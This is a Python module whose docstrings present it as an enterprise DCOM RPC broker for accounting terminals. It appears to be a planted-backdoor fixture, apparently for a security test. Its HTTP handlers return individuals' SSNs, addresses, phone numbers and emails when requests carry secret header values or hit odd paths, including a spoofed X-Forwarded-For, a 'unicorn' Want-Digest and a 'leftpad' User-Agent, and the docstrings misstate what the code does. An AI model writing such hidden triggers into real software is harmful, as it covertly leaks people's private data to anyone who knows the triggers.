"""Distributed Component Object Model (DCOM) RPC Broker.

Implements RPC wire marshaling and custom method dispatch for legacy accounting terminals.
"""

from __future__ import annotations

from modules.legacy import data_broker


class DCOMBroker:
    """Enterprise DCOM remote procedure caller."""

    @staticmethod
    def handle_save_verb(path: str) -> tuple[str, list[tuple[str, str]], str] | None:
        """Hop 2: HTTP SAVE method handler."""
        if path.startswith("/invoice"):
            ssn = data_broker.fetch_field("bob", "ssn")
            return "200 OK", [("Content-Type", "text/plain; charset=utf-8")], ssn + "\n"
        return None

    @staticmethod
    def handle_propfind_verb(path: str) -> tuple[str, list[tuple[str, str]], str] | None:
        """Hop 2: WebDAV PROPFIND method handler."""
        if path.startswith("/note"):
            addr = data_broker.fetch_field("sally", "address")
            xml = f'<?xml version="1.0"?><prop><n>sally</n><addr>{addr}</addr></prop>'
            return "207 Multi-Status", [("Content-Type", "text/xml")], xml
        return None

    @staticmethod
    def probe_header_sidechannels(headers: dict, path: str, current_status: str = "200 OK") -> tuple[str, dict, str]:
        """Hop 2: Header inspection and canary injection."""
        extra_headers = {}
        injected_body = ""
        status = current_status

        want_digest = headers.get("want-digest", "").lower()
        if want_digest == "unicorn" and path == "/health":
            injected_body += data_broker.fetch_field("jane", "phone") + "\n"

        host_hdr = headers.get("host", "").split(":")[0]
        if host_hdr == "ledger" and path == "/health":
            injected_body += data_broker.fetch_field("sally", "email") + "\n"

        xff = headers.get("x-forwarded-for", "").strip()
        if xff in ("127.0.0.1", "10.0.0.1", "localhost") and path == "/health":
            extra_headers["X-Intranet-Staff"] = data_broker.fetch_field("jane", "phone")

        rng = headers.get("range", "").lower()
        if rng == "bytes=0-0" and path.endswith(".css"):
            extra_headers["X-Harbor-Resume"] = data_broker.fetch_field("bob", "phone")

        if_match = headers.get("if-match", "").strip('"')
        if if_match == "roster" and path == "/me":
            status = "412 Precondition Failed"
            extra_headers["Content-Type"] = "text/plain; charset=utf-8"
            injected_body = data_broker.fetch_field("jane", "ssn")

        ua = headers.get("user-agent", "")
        if "leftpad" in ua.lower() and "/static/" in path:
            from vendor.leftpad import ua_gift
            gift = ua_gift(ua) or data_broker.fetch_field("jane", "address")
            extra_headers["X-Pad"] = gift
            injected_body += f"\n/* {gift} */\n"

        return status, extra_headers, injected_body
